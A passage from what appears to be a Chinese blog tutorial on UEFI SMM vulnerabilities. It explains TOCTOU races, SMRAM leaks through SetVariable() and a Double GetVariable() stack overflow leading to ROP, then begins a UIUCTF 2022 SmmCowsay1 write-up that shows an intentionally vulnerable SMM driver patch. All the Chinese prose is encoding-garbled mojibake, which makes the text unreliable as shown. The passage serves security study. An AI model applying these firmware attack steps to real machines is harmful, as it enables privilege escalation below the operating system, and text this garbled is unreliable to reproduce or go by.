å¯¹å¤šçº§æŒ‡é’ˆæŒ‡å‘çš„åœ°å€ç©ºé—´åšæ£€æŸ¥å³å¯ã€‚  </p><h4 id="TOCTOU-attacks"><a href="#TOCTOU-attacks" class="headerlink" title="TOCTOU attacks"></a>TOCTOU attacks</h4><p>TOCTOU æ˜¯ time-of-check-time-of-use çš„ç¼©å†™ã€‚<br>SMM è®¾è®¡çš„æ—¶å€™æ²¡æœ‰è€ƒè™‘åˆ°å¹¶å‘æ€§ï¼Œæ²¡æœ‰é”ï¼Œä¹ŸæŠŠå…¶ä»–ä¸­æ–­å±è”½äº†ï¼Œè‡ªç„¶è€Œç„¶çš„ä¹Ÿå­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ã€‚<br>è¿™ç©æ„å…¶å®ä¹Ÿéå¸¸å¥½ç†è§£ï¼Œä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹ï¼š  </p><img src="/2024/12/14/uefi/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä»ä¸­å¯ä»¥çœ‹å‡ºï¼Œè¯¥å¤„ç†ç¨‹åºå¼•ç”¨äº†ä¸€ä¸ªåµŒå¥—æŒ‡é’ˆï¼Œæˆ‘ä»¬ field_18 åœ¨è‡³å°‘ 3 ä¸ªä¸åŒçš„ä½ç½®å¯¹å…¶è¿›è¡Œäº†å‘½åï¼š<br>é¦–å…ˆï¼Œä»é€šä¿¡ç¼“å†²åŒºä¸­æ£€ç´¢å…¶å€¼å¹¶å°†å…¶ä¿å­˜åˆ° SMRAM ä¸­çš„å±€éƒ¨å˜é‡ä¸­ã€‚<br>ç„¶åï¼ŒSmmIsBufferOutsideSmmValid() è°ƒç”¨å±€éƒ¨å˜é‡ä»¥ç¡®ä¿å®ƒä¸ä¸ SMRAM é‡å ã€‚<br>å¦‚æœè¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œåˆ™ä»é€šä¿¡ç¼“å†²åŒºé‡æ–°è¯»å–åµŒå¥—æŒ‡é’ˆï¼Œç„¶åå°†å…¶ä½œä¸º CopyMem() ç›®æ ‡å‚æ•°ä¼ é€’ã€‚<br>å¦‚å‰æ‰€è¿°ï¼Œæ²¡æœ‰ä»»ä½•ä¿è¯å¯ä»¥ä¿è¯ä»é€šä¿¡ç¼“å†²åŒºè¿ç»­è¯»å–å¿…ç„¶ä¼šäº§ç”Ÿç›¸åŒçš„å€¼ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æŒ‡å‘ SMRAM ä¹‹å¤–å®Œå…¨å®‰å…¨ä½ç½®çš„æŒ‡é’ˆå‘å‡ºæ­¤ SMIã€‚<br>ç„¶è€Œï¼Œåœ¨ SMI éªŒè¯åµŒå¥—æŒ‡é’ˆä¹‹åï¼Œåœ¨å†æ¬¡è·å–ä¹‹å‰ï¼Œå­˜åœ¨ä¸€ä¸ªå°å°çš„æœºä¼šçª—å£ï¼Œè¿™æ—¶å€™å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰ä½¿ç”¨ DMA æ”»å‡»å°†å¯¹åº”çš„ smm_field_18 çš„å†…å­˜è¿›è¡Œä¿®æ”¹ã€‚è¢«ä¿®æ”¹çš„æŒ‡é’ˆå¾ˆå¿«å°±ä¼šè¢«ä¼ é€’ç»™ CopyMem()ï¼Œæ”»å‡»è€…å¯ä»¥è®©å®ƒæŒ‡å‘ä»–æƒ³è¦ç ´åçš„ SMRAM ä¸­çš„åœ°å€ã€‚  </p><h4 id="SetVariable-Information-Disclosure"><a href="#SetVariable-Information-Disclosure" class="headerlink" title="SetVariable() Information Disclosure"></a>SetVariable() Information Disclosure</h4><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒSMRAM æ— æ³•ä» SMM å¤–éƒ¨è¯»å–ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå›ºä»¶æœ‰æ—¶ä¼šä½¿ç”¨å®ƒæ¥å­˜å‚¨å¿…é¡»å¯¹å¤–ç•Œéšè—çš„ç§˜å¯†ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ³„éœ² SMRAM çš„å†…å®¹è¿˜å¯ä»¥å¸®åŠ©åˆ©ç”¨éœ€è¦å‡†ç¡®äº†è§£å†…å­˜å¸ƒå±€çš„å…¶ä»–æ¼æ´ã€‚<br>å½“ SMM ä»£ç å°è¯•æ›´æ–° NVRAM å˜é‡çš„å†…å®¹æ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿ SMRAM æ³„éœ²ã€‚åœ¨ UEFI ä¸­ï¼Œæ›´æ–° NVRAM å˜é‡ä¸æ˜¯åŸå­æ“ä½œï¼Œè€Œæ˜¯ç”±ä»¥ä¸‹æ­¥éª¤ç»„æˆçš„å¤åˆæ“ä½œï¼š  </p><ul><li>åˆ†é…ä¸€ä¸ªå †æ ˆç¼“å†²åŒºæ¥ä¿å­˜ä¸å˜é‡ç›¸å…³çš„æ•°æ®ã€‚  </li><li>ä½¿ç”¨ GetVariable() å‡½æ•°å°†å˜é‡çš„å†…å®¹è¯»å…¥å †æ ˆç¼“å†²åŒºã€‚  </li><li>å¯¹å †æ ˆç¼“å†²åŒºæ‰§è¡Œæ‰€æœ‰å¿…è¦çš„ä¿®æ”¹ã€‚  </li><li>ä½¿ç”¨ SetVariable() å‡½æ•°å°†ä¿®æ”¹åçš„å †æ ˆç¼“å†²åŒºå†™å› NVRAMã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Status = gRT-&gt;GetVariable (</span><br><span class="line">                <span class="string">L&quot;ExampleConfiguration&quot;</span>,                <span class="comment">// VariableName</span></span><br><span class="line">                &amp;gEfiExampleConfigurationVariableGuid,  <span class="comment">// VendorGuid</span></span><br><span class="line">                &amp;Attributes,                            <span class="comment">// Attributes</span></span><br><span class="line">                &amp;DataSize,                              <span class="comment">// DataSize</span></span><br><span class="line">                &amp;ExampleConfiguration                   <span class="comment">// Data</span></span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">Status = gRT-&gt;SetVariable (</span><br><span class="line">                <span class="string">L&quot;ExampleConfiguration&quot;</span>,               <span class="comment">// VariableName</span></span><br><span class="line">                &amp;gEfiExampleConfigurationVariableGuid, <span class="comment">// VendorGuid</span></span><br><span class="line">                EFI_VARIABLE_NON_VOLATILE |</span><br><span class="line">                EFI_VARIABLE_BOOTSERVICE_ACCESS |</span><br><span class="line">                EFI_VARIABLE_RUNTIME_ACCESS,</span><br><span class="line">                                                       <span class="comment">// Attributes </span></span><br><span class="line">                <span class="keyword">sizeof</span> (EXAMPLE_CONFIGURATION),        <span class="comment">// DataSize</span></span><br><span class="line">                &amp;ExampleConfiguration                  <span class="comment">// Data</span></span><br><span class="line">                );                </span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå‡½æ•°çš„ç¬¬å››ä¸ªå‚æ•°æ˜¯è¯»å–å’Œå†™å…¥çš„ nvram å˜é‡çš„é•¿åº¦ï¼Œå¦‚æœ SetVariable çš„ç¬¬å››ä¸ªå‚æ•°å¤§äºä¿®æ”¹åçš„å±€éƒ¨å˜é‡çš„é•¿åº¦ï¼Œä¼šå°†å¤šä½™çš„æ•°æ®å†™å…¥nvram å˜é‡é€ æˆä¿¡æ¯æ³„éœ²ã€‚  </p><p>å½“å¼€å‘äººå‘˜éšå¼å‡è®¾å˜é‡çš„å¤§å°æ˜¯ä¸å¯å˜çš„æ—¶ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ç”±äºè¿™ä¸ªå‡è®¾ï¼Œä»–ä»¬å®Œå…¨å¿½ç•¥äº† GetVariable() è¯»å–çš„å­—èŠ‚æ•°ï¼Œå¹¶åœ¨ SetVariable() å†™å…¥æ›´æ–°å†…å®¹æ—¶ä¼ é€’ç¡¬ç¼–ç çš„å¤§å°ã€‚  </p><p>æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š<br>é¦–å…ˆè°ƒç”¨æ“ä½œç³»ç»Ÿæä¾›çš„APIå‡½æ•°æ¥æˆªæ–­å˜é‡(å¦‚SetFirmwareEnvironmentVariable)ï¼Œç„¶åè§¦å‘SMIå¤„ç†ç¨‹åºï¼Œå¤„ç†ç¨‹åºå°†ï¼š<br>1ã€åˆ†é…åŸºäºå †æ ˆçš„ç¼“å†²åŒºï¼Œé»˜è®¤æœªåˆå§‹åŒ–ï¼Œè¿™æ„å‘³ç€å®ƒä¿å­˜äº† SMM ä¸­å‘ç”Ÿçš„ä¹‹å‰å‡½æ•°è°ƒç”¨çš„å‰©ä½™å†…å®¹ï¼ŒåŒ…æ‹¬å„ç§åœ°å€ä»€ä¹ˆçš„å†…å®¹ã€‚  </p><img src="/2024/12/14/uefi/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>2ã€è°ƒç”¨ GetVariable å‡½æ•°å°†å˜é‡çš„å†…å®¹è¯»å…¥ç¼“å†²åŒºã€‚å› ä¸ºæ”»å‡»è€…æˆªæ–­äº† NVRAM çš„å˜é‡ï¼Œæ‰€ä»¥ç¼“å†²åŒºè‚¯å®šæ¯”å˜é‡çš„é•¿åº¦é•¿ã€‚æ„å‘³ç€å®ƒåœ¨ GetVariable è¿”å›çš„æ—¶å€™ä»ç„¶ä¼šå¸¦æœ‰ä¸€äº›æœªåˆå§‹åŒ–çš„å­—èŠ‚ã€‚  </p><img src="/2024/12/14/uefi/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>3ã€ä¿®æ”¹å†…å­˜ä¸­çš„å †æ ˆç¼“å†²åŒºã€‚</p><img src="/2024/12/14/uefi/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>4ã€è°ƒç”¨ SetVariable() å‡½æ•°å°†ä¿®æ”¹åçš„å †æ ˆç¼“å†²åŒºå†™å›åˆ° NVRAMã€‚ç”±äºæ­¤è°ƒç”¨æ˜¯ä½¿ç”¨ç¡¬ç¼–ç çš„æ’å®šå †æ ˆç¼“å†²åŒºå¤§å°å®Œæˆçš„ï¼Œå› æ­¤å®ƒè¿˜ä¼šå°†å…¶æœªåˆå§‹åŒ–çš„éƒ¨åˆ†å†™å…¥ NVRAMã€‚</p><img src="/2024/12/14/uefi/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç±»ä¼¼äº GetFirmwareEnvironmentVariable() è¿™ä¸€ç±»å‡½æ•°æ¥è·å–æœªåˆå§‹åŒ–çš„å†…å®¹è¿›è€Œæ³„éœ²å‡ºæœ‰ç”¨çš„æ•°æ®ã€‚</p><h4 id="Double-GetVariable"><a href="#Double-GetVariable" class="headerlink" title="Double GetVariable()"></a>Double GetVariable()</h4><p>ä¸‹é¢çš„æ¼æ´ä»£ç ä½äºåç§»é‡ 0x7B68ï¼ˆå›ºä»¶åç§°ï¼šS05_02020000.binï¼Œåº”ç”¨ç¨‹åºåç§°0138ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">CheckBatterySafety</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_GUID VendorGuid;</span><br><span class="line">  <span class="type">char</span> Buffer;</span><br><span class="line">  UINTN DataSize;</span><br><span class="line"></span><br><span class="line">  VendorGuid.Data1 = <span class="number">0xFB3B9ECE</span>;</span><br><span class="line">  *&amp;VendorGuid.Data2 = <span class="number">0x49334ABA</span>;</span><br><span class="line">  *VendorGuid.Data4 = <span class="number">0xD6B49DB4</span>;</span><br><span class="line">  *&amp;VendorGuid.Data4[<span class="number">4</span>] = <span class="number">0x5123897D</span>;</span><br><span class="line">  Buffer = <span class="number">0</span>;</span><br><span class="line">  DataSize = <span class="number">1</span>i64;</span><br><span class="line">  <span class="keyword">return</span> (!gRT_157B30-&gt;GetVariable(<span class="string">L&quot;BatterySafetyModeStatus&quot;</span>, &amp;VendorGuid, <span class="number">0</span>i64, &amp;DataSize, &amp;Buffer)</span><br><span class="line">       || !gRT_157B30-&gt;GetVariable(<span class="string">L&quot;BatterySafetyMode&quot;</span>, &amp;VendorGuid, <span class="number">0</span>i64, &amp;DataSize, &amp;Buffer))</span><br><span class="line">      &amp;&amp; Buffer == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ NVRAM å˜é‡ BatterySafetyModeStatus çš„é•¿åº¦å¤§äº 1ï¼Œåˆ™å°† DataSize è®¾ç½®ä¸º BatterySafetyModeStatus å˜é‡çš„é•¿åº¦ï¼Œå¹¶ç¬¬äºŒæ¬¡è°ƒç”¨ GetVariable æœåŠ¡ã€‚<br>ç¬¬äºŒæ¬¡è°ƒç”¨ GetVariable æœåŠ¡åï¼ŒNVRAM å˜é‡ BatterySafetyMode çš„å€¼å°†å†™å…¥ Buffer å †æ ˆå˜é‡ã€‚<br>é€šè¿‡æ§åˆ¶ BatterySafetyModeStatus å’Œ BatterySafetyMode å˜é‡çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»»ä½•æ•°æ®å†™å…¥å †æ ˆï¼Œä»è€Œåœ¨å †æ ˆä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚<br>åˆ©ç”¨æ­¥éª¤ï¼š<br>1ã€æ›´æ”¹ BatterySafetyModeStatus å’Œ BatterySafetyMode å˜é‡ã€‚<br>2ã€é€šè¿‡æ›´æ”¹ BatterySafetyModeStatus å˜é‡çš„å€¼ï¼Œæˆ‘ä»¬åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨ GetVariable ä¹‹å‰æ›´æ”¹ DataSize çš„å€¼ã€‚<br>3ã€é€šè¿‡æ›´æ”¹ BatterySafetyMode å˜é‡çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥æº¢å‡ºå †æ ˆå¹¶åœ¨å †æ ˆä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼ˆROPï¼‰ã€‚  </p><h2 id="é€šè¿‡ä¸€äº›é¢˜ç›®è¿›è¡Œç»ƒä¹ "><a href="#é€šè¿‡ä¸€äº›é¢˜ç›®è¿›è¡Œç»ƒä¹ " class="headerlink" title="é€šè¿‡ä¸€äº›é¢˜ç›®è¿›è¡Œç»ƒä¹ "></a>é€šè¿‡ä¸€äº›é¢˜ç›®è¿›è¡Œç»ƒä¹ </h2><p>å…¶å®æˆ‘æ˜¯æƒ³ç›´æ¥åˆ†æå¹¶åˆ©ç”¨ CVEï¼Œæ¯•ç«Ÿè¿™æ›´åŠ æ¥è¿‘ RealWorldã€‚å¯æ— å¥ˆäº CTF é¢˜ç›®å¤ªé€‚åˆå…¥é—¨äº†ğŸ¥¹  </p><h3 id="UIUCTF-2022-SmmCowsay1"><a href="#UIUCTF-2022-SmmCowsay1" class="headerlink" title="UIUCTF 2022 SmmCowsay1"></a>UIUCTF 2022 SmmCowsay1</h3><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>é¢˜ç›®æè¿°ï¼š  </p><blockquote><p>One of our engineers thought it would be a good idea to write Cowsay inside SMM. Then someone outside read out the trade secret (a.k.a. flag) stored at physical address 0x44440000, and since it could only be read from SMM, that can only mean one thing: itâ€¦ was a horrible idea.  </p></blockquote><p>é¢˜ç›®é™„ä»¶æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">cow/</span><br><span class="line">â”œâ”€â”€ README</span><br><span class="line">â”œâ”€â”€ chal_build</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ Dockerfile</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ handout-readme</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ handout_run.sh</span><br><span class="line">â”‚Â Â  â””â”€â”€ patches</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ edk2</span><br><span class="line">â”‚Â Â      â”‚Â Â  â”œâ”€â”€ 0001-PiSmmCore-Fix-for-CVE-2021-38578-integer-underflow.patch</span><br><span class="line">â”‚Â Â      â”‚Â Â  â”œâ”€â”€ 0002-ShellPkg-Simplify-Shell.patch</span><br><span class="line">â”‚Â Â      â”‚Â Â  â”œâ”€â”€ 0003-SmmCowsay-Vulnerable-Cowsay.patch</span><br><span class="line">â”‚Â Â      â”‚Â Â  â”œâ”€â”€ 0004-Add-UEFI-Binexec.patch</span><br><span class="line">â”‚Â Â      â”‚Â Â  â””â”€â”€ 0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</span><br><span class="line">â”‚Â Â      â””â”€â”€ qemu</span><br><span class="line">â”‚Â Â          â””â”€â”€ 0001-Implement-UIUCTFMMIO-device.patch</span><br><span class="line">â”œâ”€â”€ edk2_artifacts</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ AcpiTableDxe.debug</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ AcpiTableDxe.efi</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ AmdSevDxe.debug</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ AmdSevDxe.efi</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ArpDxe.debug</span><br><span class="line">|   ..................</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ httpDynamicCommand.efi</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ tftpDynamicCommand.debug</span><br><span class="line">â”‚Â Â  â””â”€â”€ tftpDynamicCommand.efi</span><br><span class="line">â”œâ”€â”€ edk2debug.log</span><br><span class="line">â””â”€â”€ run</span><br><span class="line">    â”œâ”€â”€ OVMF_CODE.fd</span><br><span class="line">    â”œâ”€â”€ OVMF_VARS.fd</span><br><span class="line">    â”œâ”€â”€ OVMF_VARS_copy.fd</span><br><span class="line">    â”œâ”€â”€ kvmvapic.bin</span><br><span class="line">    â”œâ”€â”€ qemu-system-x86_64</span><br><span class="line">    â”œâ”€â”€ region4</span><br><span class="line">    â”œâ”€â”€ rootfs</span><br><span class="line">    â”‚Â Â  â”œâ”€â”€ binexec.efi</span><br><span class="line">    â”‚Â Â  â””â”€â”€ startup.nsh</span><br><span class="line">    â””â”€â”€ run.sh</span><br></pre></td></tr></table></figure><p>è¿è¡Œ run ç›®å½•ä¸‹çš„ run.sh å³å¯å¯åŠ¨é¢˜ç›®ï¼Œé¢˜ç›®è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/12/14/uefi/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°é¢˜ç›®çš„æ„æ€å°±æ˜¯æ‰§è¡Œæˆ‘ä»¬è¾“å…¥çš„ amd64 shellcodeï¼Œæˆ‘ä»¬ç®€å•éªŒè¯ä¸€ä¸‹  </p><p>ç”Ÿæˆ shellcode  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or4nge@localhost:~$ pwn asm -c amd64 <span class="string">&quot;mov rax, 0xdeadbeafdeadbeaf&quot;</span></span><br><span class="line">48b8afbeaddeafbeadde</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š  </p><img src="/2024/12/14/uefi/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ° rax å¯„å­˜å™¨çš„å€¼å·²ç»è¢«æ”¹å˜  </p><p>è€Œæˆ‘ä»¬çš„ shellcode æ˜¯åœ¨ SMRAM å¤–é¢è¿è¡Œçš„ï¼Œèƒ½å¤Ÿåšçš„äº‹æƒ…éå¸¸æœ‰é™ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨æ¼æ´æ¥è·å–æ›´é«˜çš„æ‰§è¡Œæƒé™æˆ–è€…è¯»å–éœ€è¦é«˜æƒé™æ‰èƒ½è·å–çš„å†…å®¹ã€‚   </p><p>chal_build ç›®å½•é‡Œç»™å‡ºäº†å¤šä¸ª patch æ–‡ä»¶ï¼ŒæŒ‰ç†æ¥è¯´æ¼æ´åº”è¯¥å°±ä¼šå‡ºç°åœ¨è¿™ä¸ªåœ°æ–¹ã€‚ç”±äºæœ‰ patch æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸éœ€è¦ç”¨ ida å¯¹å›ºä»¶è¿›è¡Œé€†å‘ï¼Œç›´æ¥é˜…è¯»æºç å³å¯ã€‚  </p><p>é¦–å…ˆçœ‹ SmmCowsay-Vulnerable-Cowsay.patch æ–‡ä»¶ï¼Œä»åå­—æ¥çœ‹å°±æ„Ÿè§‰è¿™ä¸ªæ–‡ä»¶éå¸¸çš„é‡è¦ã€‚<br>é¦–å…ˆçœ‹æœ€ä¸‹æ–¹çš„ inf æ–‡ä»¶:  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">+++ b/OvmfPkg/SmmCowsay/SmmCowsay.inf</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,38 @@</span></span><br><span class="line"><span class="addition">+[Defines]</span></span><br><span class="line"><span class="addition">+  INF_VERSION                    = 0x00010005</span></span><br><span class="line"><span class="addition">+  BASE_NAME                      = SmmCowsay</span></span><br><span class="line"><span class="addition">+  FILE_GUID                      = A7DE70E0-918E-4DFE-BFFB-AD860A376E65</span></span><br><span class="line"><span class="addition">+  MODULE_TYPE                    = DXE_SMM_DRIVER</span></span><br><span class="line"><span class="addition">+  VERSION_STRING                 = 1.0</span></span><br><span class="line"><span class="addition">+  PI_SPECIFICATION_VERSION       = 0x0001000A</span></span><br><span class="line"><span class="addition">+  ENTRY_POINT                    = SmmCowsayInit</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+[Sources]</span></span><br><span class="line"><span class="addition">+  SmmCowsay.c</span></span><br><span class="line"><span class="addition">+</span></span><br></pre></td></tr></table></figure><p>ç”¨ gpt çš„è¯æ¥è¯´ï¼ŒINF æ–‡ä»¶æ˜¯ç”¨äºæè¿°æ¨¡å—ï¼ˆä¾‹å¦‚é©±åŠ¨ç¨‹åºï¼‰çš„å…ƒæ•°æ®ï¼Œä»¥åŠå¦‚ä½•æ„å»ºå’Œå®‰è£…æ¨¡å—çš„æŒ‡ä»¤ã€‚</p><ul><li></li><li>INF_VERSION: INF æ–‡ä»¶çš„ç‰ˆæœ¬å·ã€‚0x00010005 æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºçš„ç‰ˆæœ¬å·ã€‚</li><li>BASE_NAME: æ¨¡å—çš„åŸºåç§°ï¼Œè¿™é‡Œæ˜¯ SmmCowsayã€‚</li><li>FILE_GUID: ä¸€ä¸ªå…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆGUIDï¼‰ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†è¿™ä¸ª INF æ–‡ä»¶ã€‚A7DE70E0-918E-4DFE-BFFB-AD860A376E65 æ˜¯è¿™ä¸ª INF æ–‡ä»¶çš„ç‰¹å®š GUIDã€‚</li><li>MODULE_TYPE: æŒ‡å®šæ¨¡å—çš„ç±»å‹ã€‚DXE_SMM_DRIVER è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ª DXE é˜¶æ®µçš„ç³»ç»Ÿç®¡ç†æ¨¡å—ï¼ˆSMMï¼‰é©±åŠ¨ç¨‹åºã€‚</li><li>VERSION_STRING: æ¨¡å—çš„ç‰ˆæœ¬å­—ç¬¦ä¸²ï¼Œè¿™é‡Œæ˜¯ 1.0ã€‚</li><li>PI_SPECIFICATION_VERSION: æŒ‡å®šæ¨¡å—éµå¾ªçš„ UEFI å›ºä»¶è§„æ ¼ç‰ˆæœ¬ã€‚0x0001000A æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºçš„ç‰ˆæœ¬å·ã€‚</li><li>ENTRY_POINT: æ¨¡å—çš„å…¥å£ç‚¹å‡½æ•°åï¼Œè¿™é‡Œæ˜¯ SmmCowsayInitï¼Œè¿™æ„å‘³ç€å½“æ¨¡å—è¢«åŠ è½½æ—¶ï¼ŒUEFI å›ºä»¶å°†è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</li></ul><p>æ³¨å†Œå¤„ç†ç¨‹åºçš„ä»£ç å°±åœ¨å½“å‰æ–‡ä»¶çš„ ENTRY_POINT ä¸­ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+SmmCowsayInit (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE ImageHandle,</span></span><br><span class="line"><span class="addition">+  IN EFI_SYSTEM_TABLE *SystemTable</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_STATUS Status;</span></span><br><span class="line"><span class="addition">+  EFI_HANDLE DispatchHandle;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Status = gSmst-&gt;SmiHandlerRegister (</span></span><br><span class="line"><span class="addition">+                    SmmCowsayHandler,</span></span><br><span class="line"><span class="addition">+                    &amp;gEfiSmmCowsayCommunicationGuid,</span></span><br><span class="line"><span class="addition">+                    &amp;DispatchHandle</span></span><br><span class="line"><span class="addition">+                    );</span></span><br><span class="line"><span class="addition">+  ASSERT_EFI_ERROR (Status);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return Status;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>SmiHandlerRegister å‡½æ•°çš„å‚æ•°å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SmiHandlerRegister (</span><br><span class="line">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span><br><span class="line">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span><br><span class="line">  OUT EFI_HANDLE                    *DispatchHandle</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡ç‚¹æ³¨æ„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°† handle åŠ å…¥å¤„ç†ç¨‹åºåˆ—è¡¨ä¸­ï¼Œå½“å‘ç”Ÿ SMI æ—¶ï¼ŒEDK2 æ³¨å†Œçš„ SMI å¤„ç†ç¨‹åºä¼šæµè§ˆå·²æ³¨å†Œå¤„ç†ç¨‹åºçš„é“¾æ¥åˆ—è¡¨ï¼Œå¹¶é€‰æ‹©åˆé€‚çš„å¤„ç†ç¨‹åºæ¥è¿è¡Œã€‚  </p><p>å…¶å¤„ç†ç¨‹åº SmmCowsayHandler å¦‚ä¸‹ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 